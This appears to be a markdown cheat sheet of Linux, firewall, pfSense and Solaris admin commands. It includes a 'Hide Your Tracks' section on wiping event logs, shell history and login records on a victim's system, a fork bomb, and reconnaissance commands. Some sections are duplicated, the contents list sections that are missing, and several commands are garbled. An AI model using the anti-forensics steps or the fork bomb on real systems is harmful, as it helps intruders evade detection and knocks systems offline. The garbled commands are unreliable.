Manual
======

Table of contents
=================

 **Linux**
  
* 	[Linux Network Commands](#linux-network-commands)
* 	[Linux System Info](#linux-system-info)
* 	[Manipulating files](#manipulating-files)
* 	[Linux Misc Commands](#linux-misc-commands)
* 	[Hide Your Tracks](#hide-your-tracks)
* 	[Linux Scripting](#linux-sripting)
* 	[IP Tables](#ip-tables)
* 	[Automatically run commands over SSH on many servers](#automatically-run-commands-over-ssh-on-many-servers)
* 	[CHKCONFIG](#chkconfig)
* 	[Kali Linux Commands](#kali-linux-commands)
* 	[Solaris](#solaris)
  
**Windows**

- 	[Windows Versions](#windows-versions)
- 	[Startup Directories](#startup-directories)
- 	[Useful Run Commands](#useful-run-commands)
- 	[Windows System Info Commands](#windows-system-info-commands)
- 	[Windows Net_Domain Commands](#windows-net_domain-commands)
-	[Running Remote Commands](#running-remote-commands)
- 	[Windows Network Commands](#windows-netowrk-commands)
- 	[Hidden tools in Command Line](#hidden-tools-in-command-line)
- 	[Miscellaneous Commands Windows](#miscellaneous-commands-windows)
- 	[PsExec](#psexec)
- 	[Terminal Services](#terminal-services)
- 	[WMIC](#wmic)
- 	[Powershell](#powershell)
- 	[Windows Registry](#windows-registry)

**Networking**

- 	[Common ports](#common-ports)
- 	[IPv4](#ipv4)
-	[IPv6](#ipv6)
-	[Cisco commands](#cisco-commands)
-	[SNMP](#snmp)
-	[Packet Capturing](#packet-capturing)
-	[DNS](#dns)
-	[VPN](#vpn)

**PenTesting**

-	[Brute Forcing Services](#brute-forcing-services)
-	[Exploit Research](#exploit-research)
-	[Metasploit](#metasploit)
-	[Password Cracking](#password-cracking)

**Literatura**

-	[References](Literatura.md)

Linux Network Commands 
----------------------

General networking concepts that will help you in troubleshooting networks on Linux [[26]](http://linux-training.be/linuxnet.pdf).

    $ watch ss -tp                               # Network connections
    $ netstat -ant                               # Tcp connections -anu=udp
    $ netstat -tulpn                             # Connections with PIDs
    $ lsof -i                                    # Established connections
    $ smb:// ip /share                           # Access windows smb share
    $ share user x.x.x.x c$                      # Mount Windows share
    $ smbclient -0 user\\\\ ip \\ share          # SMB connect
    $ ifconfig eth# ip / cidr                    # Set IP and netmask
    $ ifconfig ethO:l ip / cidr                  # Set virtual interface
    $ route add default gw gw_ip                 # Set GW
    $ ifconfig eth# mtu [size]                   # Change MTU size
    $ export MAC=xx: xx: xx: xx: xx: xx          # Change MAC 
    $ ifconfig int hw ether MAC                  # Change MAC
    $ macchanger -m MAC int                      # Backtrack MAC changer
    $ iwlist int scan                            # Built-in wifi scanner
    $ dig -x ip                                  # Domain lookup for IP
    $ host ip                                    # Domain lookup for IP
    $ host -t SRV _ service _tcp.url.com         # Domain SRV lookup
    $ dig @ ip domain -t AXFR                    # DNS Zone Xfer
    $ host -l domain namesvr                     # DNS Zone Xfer
    $ ip xfrm state list                         # Print existing VPN keys
    $ ip addr add ip / cidr dev ethO             # Adds 'hidden' interface
    $ /var/log/messages | grep DHCP              # List DHCP assignments
    $ tcpkill host ip and port port              # Block ip:port
    $ echo "1" /proc/sys/net/ipv4/ip_forward     # Turn on IP Forwarding
    $ echo "nameserver x.x.x.x" /etc/resolv.conf # Add DNS Server

Linux System Info 
-----------------

Most common commands used to check information and configuration details about various hardware peripherals and devices.[[34]]

    $ lscpu                  # Reports information abut cpu and processing units
    $ lshw                   # List hardware
    $ hwinfo                 # Hardware information
    $ lspci                  # List PCI
    $ lsscsi                 # List scsi devices
    $ lsusb                  # List usb buses and device details
    $ inxi                   # Bash script that fetches hardware details
    $ lsblk                  # List block devices
    $ df                     # Disk space of file systems
    $ pydf                   # Python df
    $ fdisk                  # Utility to modify partitions on hard drives
    $ mount                  # Used to mount/unmount and view mounted file systems
    $ free                   # Check RAM
    $ dmidecode              # Extracts hardware information by reading data from the SMBIOS data structures
    $ /proc files            # Virtual files in /proc directory contain information about hardware and configurations
    $ hdparm                 # Gets information about sata devices
    
[34]: <http://www.binarytides.com/linux-commands-hardware-info/>

Linux Misc Commands 
-------------------

Search commands[[25]]

    $ find -type f | xargs ls -l | cut -c 33- | sort -n     # Search for files - sort by filesize (add -r for reverse order)
    $ find -atime +32 -exec mv {} /var/archive/logs \;      # Move files that are over 1 month old
RPM commands

    $ rpm -q -a             # List all installed packages
    $ rpm -U -v *.rpm       # Upgrade packages
    $ rpm -Fvh *.rpm        # Freshen packages This is the one you should use when applying the latest fixes
    $ for i in `cat <dir to rpm files>`; do if rpm -qpl $i | grep libX >/dev/null; then echo $i; fi; done      # To find which rpm file (not installed) has the file libX

Debian commands

    $ apt-cache search <searchterm>         # Search for package
    $ sudo apt-get install <packagename>    # Install package from repository
    $ sudo dpkg --install <packagename.deb> # Install package from localfile
    $ sudo apt-get update                   # Update package listsfrom repositories
    $ sudo apt-get -u upgrade               # Upgrade installed packages to latest version

Basic script functions

    $ for filename in * ; do echo > $filename; done     # Basic script to perform something against a number of files

Counting commands

    $ grep -v -e "^$" filename | wc -l      # To count number of none empty lines in a file
    $ find . -name "*.p?" | xargs grep -v -e "^$" - | wc -l     # To count number of source code lines (perl)
    
[25]: <http://www.penguintutor.com/linux/misc-quickreference>

Manipulating files 
------------------

Most frequently used Linux Commands for manipulating files.[[35]]

    $ cp file1 file         # Copies the contents of file1 into file2. If file2 does not exist, it is created
    $ cp -i file1 file2     # If file2 exists, the user is prompted before it is overwritten with the contents of file1
    $ mv file1 file2        # If file2 does not exist, then file1 is renamed file2. If file2 exists, its contents are replaced with the contents of file1
    $ rm file1 file2        # Deletes file1 and file2
    $ mkdir directory       # Create directories
[35]: <http://linuxcommand.org/lts0050.php>

Linux Misc Commands
-------------------

Search commands[[25]]

    $ find -type f | xargs ls -l | cut -c 33- | sort -n     # Search for files - sort by filesize (add -r for reverse order)
    $ find -atime +32 -exec mv {} /var/archive/logs \;      # Move files that are over 1 month old
RPM commands

    $ rpm -q -a             # List all installed packages
    $ rpm -U -v *.rpm       # Upgrade packages
    $ rpm -Fvh *.rpm        # Freshen packages This is the one you should use when applying the latest fixes
    $ for i in `cat <dir to rpm files>`; do if rpm -qpl $i | grep libX >/dev/null; then echo $i; fi; done      # To find which rpm file (not installed) has the file libX

Debian commands

    $ apt-cache search <searchterm>         # Search for package
    $ sudo apt-get install <packagename>    # Install package from repository
    $ sudo dpkg --install <packagename.deb> # Install package from localfile
    $ sudo apt-get update                   # Update package listsfrom repositories
    $ sudo apt-get -u upgrade               # Upgrade installed packages to latest version

Basic script functions

    $ for filename in * ; do echo > $filename; done     # Basic script to perform something against a number of files

Counting commands

    $ grep -v -e "^$" filename | wc -l      # To count number of none empty lines in a file
    $ find . -name "*.p?" | xargs grep -v -e "^$" - | wc -l     # To count number of source code lines (perl)
    
[25]: <http://www.penguintutor.com/linux/misc-quickreference>

Hide Your Tracks 
---------------------

### Meterpreter [[11]]

    $ clearev   # Clear all event logs (Application, System, Security)
### Windows machines

- Download [clearlogs.exe]
- Run: clearlogs.exe -sec
NOTICE: You will need physical access to the victims system

### Linux systems

    $ kwrite /var/log/messages  # Delete all or specific entries
    NOTICE: You can use any other text editor
    
### Erasing the Command History

    $ more ~/.bash_history      # Command history
    $ echo $HISTSIZE            # The size of our history file
    $ export HISTSIZE=0         # Set the histoty file size to zero
    
### Shredding the History File

    $ shred -zu root/.bash_history      # The shred command with the -zu switches will overwrite the history with zeros and delete the file.
    
### The logs [[12]]

    $ WTMP      # Every log on/off, with login/logout time plus tty and host
    $ UTMP      # Who is online at the moment
    $ LASTLOG   # Where did the logins come from 
### Location of logs 

- UTMP : /etc or /var/adm or /usr/adm or /usr/var/adm or /var/log
- WTMP : /etc or /var/adm or /usr/adm or /usr/var/adm or /var/log
- LASTLOG : /usr/var/adm or /usr/adm or /var/adm or /var/log

    NOTICE: The location depends on UNIX distribution

### Shell History
    
    $ mv .logout save.1         
    $ echo rm .history>.logout
    $ echo rm .logout>>.logout
    $ echo mv save.1 .logout>>.logout
    # Delete .history
    
### Log modifier programs

    $ ah-1_0b.tar   # Changes the entries of accounting information
    $ clear.c       # Deletes entries in utmp, wtmp, lastlog and wtmpx
    $ cloak2.c      # Changes the entries in utmp, wtmp and lastlog
    $ invisible.c   # Overwrites utmp, wtmp and lastlog with predefines values
    $ marryv11.c    # Edit utmp, wtmp, lastlog and accounting data
    $ wzap.c        # Deletes entries in wtmp
    $ wtmped.c 	    # Deletes entries in wtmp
    $ zap.c         # Overwrites utmp, wtmp, lastlog - Don't use! Can be detected!
    NOTICE: Never delete the logs

[11]: <http://null-byte.wonderhowto.com/how-to/hack-like-pro-cover-your-tracks-leave-no-trace-behind-target-system-0148123/>


[clearlogs.exe]: <http://ntsecurity.nu/toolbox/clearlogs/>
[12]: <http://www.ouah.org/cover_your_tracks1.html>

Linux scripting
---------------

### Understanding bash scripting [[27]]

### Ping sweep without NMAP [[28]]

    $ for i in `seq 1 255`; do ping -c 1 10.10.10.$i | tr \\n ' ' | awk '/1 received/ {print $2}'; done
    $ for i in {1..254}; do ping -c 1 -W 1 10.1.1.$i | grep 'from'; done

### Fork bomb [[29]]

    $ :(){ :|:& };:     # forkbomb(){ forkbomb | forkbomb & }; forkbomb
    
### Monitor DNS [[30]]
-It takes the IP address or hostname of the DNS server to check. Checks the records defined in the array.

    //Define defaults
    if($_SERVER[argv][1])
    {
    $ns_server = $_SERVER[argv][1];
    } else {
    echo "You need to supply a DNS server to check. Quitting.\n";
    exit;
    }
    $hosts = array("zabbix.com" => "85.113.250.92",
    "php.net" => "69.147.83.197");
    // Do query
    foreach($hosts as $host => $ip)
    {
    $result = shell_exec("dig +time=1 +tries=1 +short @".$ns_server." ".$host);
    if(!preg_match('/'.$ip.'/', $result))
    {
    $failed = TRUE;
    }
    }
    if($failed)
    {
    echo "0\n";
    } else {
    echo "1\n";
    }
    ?>

### Monitoring NTP [[31]]

    #!/usr/local/bin/bash
    #ntptest
    #NTP test scripts for Zabbix monitor. Conditional return
    # of 1=success | 0= for failed response
    HOST_QUERY=$1
    if [`ntpq -pn $HOST_QUERY | grep -E -c '^\*'` -eq 1 ]; then
    #Sync responded, OK
    echo "1"
    else
    echo "0"
    fi
    
    NOTICE: Works with *nix Zabbix Server

### Special shell variables to be aware [[32]]

    $ $*    # Passes in all of the arguments. This is useful for FOR loops
    $ $?    # Gets the error code (exit()) status) of the last program executed
    $ $$    # Gets the PID of the current shell.
    $ $!    # Gets the PID of the last background process
    $ $EUID # Gets the effective UID number of the scripts execution

### Linux Iptables Firewall Shell Script For Standalone Server [[33]]

    #!/bin/bash
    # A Linux Shell Script with common rules for IPTABLES Firewall.
    # By default this script only open port 80, 22, 53 (input)
    # All outgoing traffic is allowed (default - output)
    # -------------------------------------------------------------------------
    # Copyright (c) 2004 nixCraft project <http://cyberciti.biz/fb/>
    # This script is licensed under GNU GPL version 2.0 or above
    # -------------------------------------------------------------------------
    # This script is part of nixCraft shell script collection (NSSC)
    # Visit http://bash.cyberciti.biz/ for more information.
    # -------------------------------------------------------------------------
    IPT="/sbin/iptables"
    SPAMLIST="blockedip"
    SPAMDROPMSG="BLOCKED IP DROP"
    echo "Starting IPv4 Wall..."
    $IPT -F
    $IPT -X
    $IPT -t nat -F
    $IPT -t nat -X
    $IPT -t mangle -F
    $IPT -t mangle -X
    modprobe ip_conntrack
    [ -f /root/scripts/blocked.ips.txt ] && BADIPS=$(egrep -v -E "^#|^$" /root/scripts/blocked.ips.txt)
    PUB_IF="eth0"
    #unlimited
    $IPT -A INPUT -i lo -j ACCEPT
    $IPT -A OUTPUT -o lo -j ACCEPT
    # DROP all incomming traffic
    $IPT -P INPUT DROP
    $IPT -P OUTPUT DROP
    $IPT -P FORWARD DROP
    if [ -f /root/scripts/blocked.ips.txt ];
    then
    # create a new iptables list
    $IPT -N $SPAMLIST
    for ipblock in $BADIPS
    do
       $IPT -A $SPAMLIST -s $ipblock -j LOG --log-prefix "$SPAMDROPMSG"
       $IPT -A $SPAMLIST -s $ipblock -j DROP
    done
    $IPT -I INPUT -j $SPAMLIST
    $IPT -I OUTPUT -j $SPAMLIST
    $IPT -I FORWARD -j $SPAMLIST
    fi
    # Block sync
    $IPT -A INPUT -i ${PUB_IF} -p tcp ! --syn -m state --state NEW  -m limit --limit 5/m --limit-burst 7 -j LOG --log-level 4 --log-prefix "Drop Sync"
    $IPT -A INPUT -i ${PUB_IF} -p tcp ! --syn -m state --state NEW -j DROP
    # Block Fragments
    $IPT -A INPUT -i ${PUB_IF} -f  -m limit --limit 5/m --limit-burst 7 -j LOG --log-level 4 --log-prefix "Fragments Packets"
    $IPT -A INPUT -i ${PUB_IF} -f -j DROP
    # Block bad stuff
    $IPT  -A INPUT -i ${PUB_IF} -p tcp --tcp-flags ALL FIN,URG,PSH -j DROP
    $IPT  -A INPUT -i ${PUB_IF} -p tcp --tcp-flags ALL ALL -j DROP
    $IPT  -A INPUT -i ${PUB_IF} -p tcp --tcp-flags ALL NONE -m limit --limit 5/m --limit-burst 7 -j LOG --log-level 4 --log-prefix "NULL Packets"
    $IPT  -A INPUT -i ${PUB_IF} -p tcp --tcp-flags ALL NONE -j DROP # NULL packets
    $IPT  -A INPUT -i ${PUB_IF} -p tcp --tcp-flags SYN,RST SYN,RST -j DROP
    $IPT  -A INPUT -i ${PUB_IF} -p tcp --tcp-flags SYN,FIN SYN,FIN -m limit --limit 5/m --limit-burst 7 -j LOG --log-level 4 --log-prefix "XMAS Packets"
    $IPT  -A INPUT -i ${PUB_IF} -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP #XMAS
    $IPT  -A INPUT -i ${PUB_IF} -p tcp --tcp-flags FIN,ACK FIN -m limit --limit 5/m --limit-burst 7 -j LOG --log-level 4 --log-prefix "Fin Packets Scan"
    $IPT  -A INPUT -i ${PUB_IF} -p tcp --tcp-flags FIN,ACK FIN -j DROP # FIN packet scans
    $IPT  -A INPUT -i ${PUB_IF} -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG -j DROP
    # Allow full outgoing connection but no incomming stuff
    $IPT -A INPUT -i eth0 -m state --state ESTABLISHED,RELATED -j ACCEPT
    $IPT -A OUTPUT -o eth0 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
    # Allow ssh
    $IPT -A INPUT -p tcp --destination-port 22 -j ACCEPT
    # allow incomming ICMP ping pong stuff
    $IPT -A INPUT -p icmp --icmp-type 8 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
    $IPT -A OUTPUT -p icmp --icmp-type 0 -m state --state ESTABLISHED,RELATED -j ACCEPT
    # Allow port 53 tcp/udp (DNS Server)
    $IPT -A INPUT -p udp --dport 53 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
    $IPT -A OUTPUT -p udp --sport 53 -m state --state ESTABLISHED,RELATED -j ACCEPT
    $IPT -A INPUT -p tcp --destination-port 53 -m state --state NEW,ESTABLISHED,RELATED  -j ACCEPT
    $IPT -A OUTPUT -p tcp --sport 53 -m state --state ESTABLISHED,RELATED -j ACCEPT
    # Open port 80
    $IPT -A INPUT -p tcp --destination-port 80 -j ACCEPT
    ##### Add your rules below ######
    ##### END your rules ############
    # Do not log smb/windows sharing packets - too much logging
    $IPT -A INPUT -p tcp -i eth0 --dport 137:139 -j REJECT
    $IPT -A INPUT -p udp -i eth0 --dport 137:139 -j REJECT
    # log everything else and drop
    $IPT -A INPUT -j LOG
    $IPT -A FORWARD -j LOG
    $IPT -A INPUT -j DROP
    exit 0
[27]: <https://linuxconfig.org/bash-scripting-tutorial>
[28]: <http://www.commandlinefu.com/commands/view/3144/ping-sweep-without-nmap>
[29]: <https://linuxconfig.org/how-to-crash-your-linux-system-with-fork-bomb>
[30]: <https://www.zabbix.com/forum/showpost.php?p=31561&postcount=2>
[31]: <https://www.zabbix.com/forum/showpost.php?p=31549&postcount=1>
[32]: <http://wiki.jaxhax.org/images/9/94/Shell_Scripting_Crash_Course.pdf>
[33]: <https://bash.cyberciti.biz/firewall/linux-iptables-firewall-shell-script-for-standalone-server/>

IP Tables 
---------

### Create a set named geoset[[13]]

    $ sudo ipset create geoblock hash:net,port
    
### Loop that runs banning list of countries from reaching the service of SSHD

    for IP in $(wget -O –                                                               http://www.ipdeny.com/ipblocks/data/countries/{cn,ru,kr,pk,tw,sg,hk}.zone)
    do
    # regular ban - block port 22 for countryXX
    sudo ipset add geoblock $IP,22
    done

### Preview of the list

    #  sudo ipset list geoblock
### Delete whole list

    # sudo ipset del geoblock|"setname"

### Add rules to IPtables

    # sudo iptables -I INPUT -m set --set geoblock src -j DROP
    
### Save IPtables

    # service iptables save
    
### Reverse function

    # sudo iptables -A INPUT -m set --set !geoblock src -j DROP
    
### Connection States [[14]]

    #iptables -A INPUT -p tcp --dport ssh -s 10.10.10.10 -m state --state NEW,ESTABLISHED -j ACCEPT
    #iptables -A OUTPUT -p tcp --sport 22 -d 10.10.10.10 -m state --state ESTABLISHED -j ACCEPT
    
### Accept connections by default

    iptables --policy INPUT ACCEPT
    iptables --policy OUTPUT ACCEPT
    iptables --policy FORWARD ACCEPT
   
### Red Hat Linux firewall [[15]]

### IPtables Packet Flow Diagram [[16]]

![Iptables.gif](https://www.dropbox.com/s/5gwp8tk1q9hhnr4/Iptables.gif?dl=0&raw=1)

[13]: <http://www.dghost.com/techno/internet/banning-an-entire-country-with-iptablesipset>
[14]: <http://www.howtogeek.com/177621/the-beginners-guide-to-iptables-the-linux-firewall/>
[15]: <http://oceanpark.com/notes/firewall_example.html>
[16]: <http://www.linuxhomenetworking.com/wiki/index.php/Quick_HOWTO_:_Ch14_:_Linux_Firewalls_Using_iptables#.WG_4SNRACdJ>

Example 
-------
[[1]]

    tmpdir=${TMPDIR:-/tmp}/pssh.$$
    mkdir -p $tmpdir
    count=0
    while IFS= read -r userhost; do
        ssh -n -o BatchMode=yes ${userhost} 'uname -a' > ${tmpdir}/${userhost} 2>&1 &
        count=`expr $count + 1`
    done < userhost.lst
    while [ $count -gt 0 ]; do
        wait $pids
        count=`expr $count - 1`
    done
    echo "Output for hosts are in $tmpdir"
[1]:<http://unix.stackexchange.com/a/19015>

CHKCONFIG 
---------

The chkconfig utility is a command-line tool that allows you to specify in which runlevel to start a selected service, as well as to list all available services along with their current setting.[[3]]

    $ chkconfig --list                              # Listing the Services
    $ chkconfig --list service_name                 # Display the current settings for a selected service only
    $ chkconfig service_name on                     # Enabling a Service
    $ chkconfig service_name on --level runlevels   # To enable a service in certain runlevels only
    $ chkconfig service_name off                    # Disabling a Service
    
[3]: <https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/6/html/Deployment_Guide/s2-services-chkconfig.html>

Kali Linux Commands 
-------------------
[[24]]

    $ apropos     #   Change access permissions
    $ chown 	  #   Change file owner and group
    $ chroot 	  #   Run a command with a different root directory
    $ chkconfig   #	  System services (runlevel)
    $ cksum 	  #   Print CRC checksum and byte counts
    $ clear 	  #   Clear terminal screen
    $ cmp 	      #   Compare two files
    $ comm 	      #   Compare two sorted files line by line
    $ command 	  #   Run a command – ignoring shell functions
    $ continue 	  #   Resume the next iteration of a loop
    $ cp 	      #   Copy one or more files to another location
    $ cron 	      #   Daemon to execute scheduled commands
    $ crontab 	  #   Schedule a command to run at a later time
    $ csplit 	  #   Split a file into context-determined pieces
    $ cut 	      #   Divide a file into several parts
    $ date 	      #   Display or change the date and time
    $ dc 	      #   Desk Calculator
    $ dd 	      #   Convert and copy a file, write disk headers, boot records
    $ ddrescue 	  #   Data recovery tool
    $ declare 	  #   Declare variables and give them attributes
    $ df 	      #   Display free disk space
    $ diff 	      #   Display the differences between two files
    $ diff3 	  #   Show differences among three files
    $ dig 	      #   DNS lookup
    $ dir 	      #   Briefly list directory contents
    $ dircolors   #	  Colour setup for `ls’
    $ dirname 	  #  Convert a full pathname to just a path
    $ dirs 	      #  Display list of remembered directories
    $ dmesg 	  #  Print kernel &amp; driver messages
    $ du 	      #  Estimate file space usage
    $ echo 	      #  Display message on screen
    $ egrep 	  #  Search files for lines that match an extended expression
    $ eject 	  #  Eject removable media
    $ enable 	  #  Enable and disable builtin shell commands
    $ env 	      #  Environment variables
    $ ethtool 	  #  Ethernet card settings
    $ eval 	      #  Evaluate several commands/arguments
    $ exec 	      #  Execute a command
    $ exit 	      #  Exit the shell
    $ expect 	  #  Automate arbitrary applications accessed over a terminal
    $ expand 	  #  Convert tabs to spaces
    $ export 	  #  Set an environment variable
    $ expr 	      #  Evaluate expressions
    $ false 	  #  Do nothing, unsuccessfully
    $ fdformat 	  #  Low-level format a floppy disk
    $ fdisk 	  #  Partition table manipulator for Linux
    $ fg 	      #  Send job to foreground
    $ fgrep 	  #  Search files for lines that match a fixed string
    $ file 	      #  Determine file type
    $ find 	      #  Search for files that meet a desired criteria
    $ fmt 	      #  Reformat paragraph text
    $ fold 	      #  Wrap text to fit a specified width
    $ for 	      #  Expand words, and execute commands
    $ format 	  #  Format disks or tapes
    $ free 	      #  Display memory usage
    $ fsck 	      #  File system consistency check and repair
    $ ftp 	      #  File Transfer Protocol
    $ function 	  #  Define Function Macros
    $ fuser 	  #  Identify/kill the process that is accessing a file
    $ gawk 	      #  Find and Replace text within files
    $ getopts 	  #  Parse positional parameters
    $ grep 	      #  Search files for lines that match a given pattern
    $ groupadd 	  #  Add a user security group
    $ groupdel 	  #  Delete a group
    $ groupmod 	  #  Modify a group
    $ groups 	  #  Print group names a user is in
    $ gzip 	      #  Compress or decompress named files
    $ hash 	      #  Remember the full pathname of a name argument
    $ head 	      #  Output the first part of files
    $ help 	      #  Display help for a built-in command
    $ history 	  #  Command History
    $ hostname 	  #  Print or set system name
    $ iconv 	  #  Convert the character set of a file
    $ id 	      #  Print user and group id’s
    $ if 	      #  Conditionally perform a command
    $ ifconfig 	  #  Configure a network interface
    $ ifdown 	  #  Stop a network interface
    $ ifup 	      #  Start a network interface up
    $ import 	  #  Capture an X server screen and save the image to file
    $ install 	  #  Copy files and set attributes
    $ jobs 	      #  List active jobs
    $ join 	      #  Join lines on a common field
    $ kill 	      #  Stop a process from running
    $ killall 	  #  Kill processes by name
    $ less 	      #  Display output one screen at a time
    $ let 	      #  Perform arithmetic on shell variables
    $ ln 	      #  Create a symbolic link to a file
    $ local 	  #  Create variables
    $ locate 	  #  Find files
    $ logname 	  #  Print current login name
    $ logout 	  #  Exit a login shell
    $ look 	      #  Display lines beginning with a given string
    $ lpc 	      #  Line printer control program
    $ lpr 	      #  Off line print
    $ lprint 	  #  Print a file
    $ lprintd 	  #  Abort a print job
    $ lprintq 	  #  List the print queue
    $ lprm 	      #  Remove jobs from the print queue
    $ ls 	      #  List information about files
    $ lsof 	      #  List open files
    $ make 	      #  Recompile a group of programs
    $ man 	      #  Help manual
    $ mkdir 	  #  Create new folders
    $ mkfifo 	  #  Make FIFOs (named pipes)
    $ mkisofs 	  #  Create an hybrid ISO9660/JOLIET/HFS filesystem
    $ mknod 	  #  Make block or character special files
    $ more 	      #  Display output one screen at a time
    $ mount 	  #  Mount a file system
    $ mtools 	  #  Manipulate MS-DOS files
    $ mtr 	      #  Network diagnostics (traceroute/ping)
    $ mv 	      #  Move or rename files or directories
    $ mmv 	      #  Mass Move and rename files
    $ netstat 	  #  Networking information
    $ nice 	      #  Set the priority of a command or job
    $ nl 	      #  Number lines and write files
    $ nohup 	  #  Run a command immune to hangups
    $ notify-send #  Send desktop notifications
    $ nslookup 	  #  Query Internet name servers interactively
    $ open 	      #  Open a file in its default application
    $ op 	      #  Operator access
    $ passwd 	  #  Modify a user password
    $ paste 	  #  Merge lines of files
    $ pathchk 	  #  Check file name portability
    $ ping 	      #  Test a network connection
    $ pkill 	  #  Stop processes from running
    $ popd 	      #  Restore the previous value of the current directory
    $ pr 	      #  Prepare files for printing
    $ printcap 	  #  Printer capability database
    $ printenv 	  #  Print environment variables
    $ printf 	  #  Format and print data
    $ ps 	      #  Process status
    $ pushd 	  #  Save and then change the current directory
    $ pwd 	      #  Print Working Directory
    $ quota 	  #  Display disk usage and limits
    $ quotacheck  #  Scan a file system for disk usage
    $ quotactl 	  #  Set disk quotas
    $ ram 	      #  ram disk device
    $ rcp 	      #  Copy files between two machines
    $ read 	      #  Read a line from standard input
    $ readarray   #  Read from stdin into an array variable
    $ readonly 	  #  Mark variables/functions as readonly
    $ reboot 	  #  Reboot the system
    $ rename 	  #  Rename files
    $ renice 	  #  Alter priority of running processes
    $ remsync 	  #  Synchronize remote files via email
    $ return 	  #  Exit a shell function
    $ rev 	      #  Reverse lines of a file
    $ rm 	      #  Remove files
    $ rmdir 	  #  Remove folders
    $ rsync 	  #  Remote file copy (Synchronize file trees)
    $ screen 	  #  Multiplex terminal, run remote shells via ssh
    $ scp 	      #  Secure copy (remote file copy)
    $ sdiff 	  #  Merge two files interactively
    $ sed 	      #  Stream Editor
    $ select 	  #  Accept keyboard input
    $ seq 	      # Print numeric sequences
    $ set 	      #  Manipulate shell variables and functions
    $ sftp 	      #  Secure File Transfer Program
    $ shift 	  #  Shift positional parameters
    $ shopt 	  #  Shell Options
    $ shutdown 	  #  Shutdown or restart linux
    $ sleep 	  #  Delay for a specified time
    $ slocate 	  #  Find files
    $ sort 	      # Sort text files
    $ source 	  #  Run commands from a file
    $ split 	  #  Split a file into fixed-size pieces
    $ ssh 	      #  Secure Shell client (remote login program)
    $ strace 	  #  Trace system calls and signals
    $ su 	      #  Substitute user identity
    $ sudo 	      #  Execute a command as another user
    $ sum 	      #  Print a checksum for a file
    $ suspend 	  #  Suspend execution of this shell
    $ symlink 	  #  Make a new name for a file
    $ sync 	      #  Synchronize data on disk with memory
    $ tail 	      #  Output the last part of file
    $ tar 	      #  Tape Archiver
    $ tee 	      #  Redirect output to multiple files
    $ test 	      #  Evaluate a conditional expression
    $ time 	      #  Measure Program running time
    $ times 	  #  User and system times
    $ touch 	  #  Change file timestamps
    $ top 	      #  List processes running on the system
    $ traceroute  #  Trace Route to Host
    $ trap 	      #  Run a command when a signal is set(bourne)
    $ tr 	      #  Translate, squeeze, and/or delete characters
    $ true 	      #  Do nothing, successfully
    $ tsort 	  #  Topological sort
    $ tty 	      #  Print filename of terminal on stdin
    $ type 	      #  Describe a command
    $ ulimit 	  #  Limit user resources
    $ umask 	  #  Users file creation mask
    $ umount 	  #  Unmount a device
    $ unalias 	  #  Remove an alias
    $ uname 	  #  Print system information
    $ unexpand 	  #  Convert spaces to tabs
    $ uniq 	      #  Uniquify files
    $ units 	  #  Convert units from one scale to another
    $ unset 	  #  Remove variable or function names
    $ unshar 	  #  Unpack shell archive scripts
    $ until 	  #  Execute commands (until error)
    $ uptime 	  #  Show uptime
    $ useradd 	  #  Create new user account
    $ usermod 	  #  Modify user account
    $ users 	  #  List users currently logged in
    $ uuencode 	  #  Encode a binary file
    $ uudecode 	  #  Decode a file created by uuencode
    $ v 	      #  Verbosely list directory contents (`ls -l -b’)
    $ vdir 	      #  Verbosely list directory contents (`ls -l -b’)
    $ vi 	      #  Text Editor
    $ vmstat 	  #  Report virtual memory statistics
    $ wait 	      #  Wait for a process to complete
    $ watch 	  #  Execute/display a program periodically
    $ wc 	      #  Print byte, word, and line counts
    $ whereis 	  #  Search the user’s $path, man pages and source files for a program
    $ which 	  #  Search the user’s $path for a program file
    $ while 	  #  Execute commands
    $ who 	      #  Print all usernames currently logged in
    $ whoami 	  #  Print the current user id and name (`id -un’)
    $ wget 	      #  Retrieve web pages or files via HTTP, HTTPS or FTP
    $ write 	  #  Send a message to another user
    $ xargs 	  #  Execute utility, passing constructed argument lists
    $ xdg-open 	  #  Open a file or URL in the user’s preferred application
    $ yes 	      #  Print a string until interrupted
    
[24]: <https://techlog360.com/a-z-kali-linux-commands/>

Using the PHP pfSense Shells 
---------------------------------

Using the PHP pfSense shell allows configuration of the config.xml file directly without needing to use the webConfigurator.[[49]]

### Options
![ii.png](https://www.dropbox.com/s/3mhvnw8v1eiql99/ii.png?dl=0&raw=1)

### pfSense Developer Shell

    print_r($config);                                               # To output a configuration array
    print_r($config['interfaces']);                                 # To output the interfaces configuration portion of config.xml
    print_r($config['dhcpd']);                                      # To output the dhcp server configuration 
    exit                                                            # To exit the  developer shell
    print_r(get_wireless_modes(\"ath0\"));                          # To output supported wireless modes for an interface 
    $config['system']['enablesshd'] = true; # To enable SSH
    $config['interfaces']['optx']['wireless']['standard'] = "11a";  # Change OPTX to the OPT interface name such as BACKHAUL
    $config['interfaces']['optx']['wireless']['mode'] = "hostap";   
    $config['interfaces']['optx']['wireless']['channel'] = "6";
    $config['dhcpd']['optx']['enable'] = true;                      # To enable dhcp server for an optx interface
    $config['dhcpd']['optx']['range']['from'] = "192.168.31.100";
    $config['dhcpd']['optx']['range']['to'] = "192.168.31.150";
    $config['system']['disablefilter'] = true;                      # Disable the firewall filter
    $config['interfaces']['optx']['disabled'] = false;              # Enable an interface and configure it as a DHCP client
    $config['interfaces']['optx']['ipaddr'] = "dhcp";
    $config['interfaces']['wan']['enable'] = true;                  # Enable an interface and set a static IPv4 address
    $config['interfaces']['wan']['ipaddr'] = "192.168.100.1";
    $config['interfaces']['wan']['subnet'] = "24";
    write_config();                                                 # Save out the new configuration (config.xml)
    system_reboot_sync();                                           # Reboot the system after saving

[49]:<https://doc.pfsense.org/index.php/Using_the_PHP_pfSense_Shell>

Solaris 
-------
[[45]]

    ifconfig -a                                 # List of interfaces
    netstat -in                                 # List of interface
    ifconfig -r                                 # Route listing
    ifconfig ethO dhcp                          # Start DHCP client
    ifconfig ethO plumb up ip netmask nmask     # SET IP
    route add default ip                        # Set gateway
    logins -p                                   # List users w/out passwords
    svcs -a                                     # List all services w/ status
    prstat -a                                   # Process listing (top)
    svcadm start ssh                            # Start SSH service
    inetadm -e telnet (-d for disable)          # Enable telnet
    prtconf I grep Memory                       # Total physical memory
    iostat -En                                  # Hard disk size
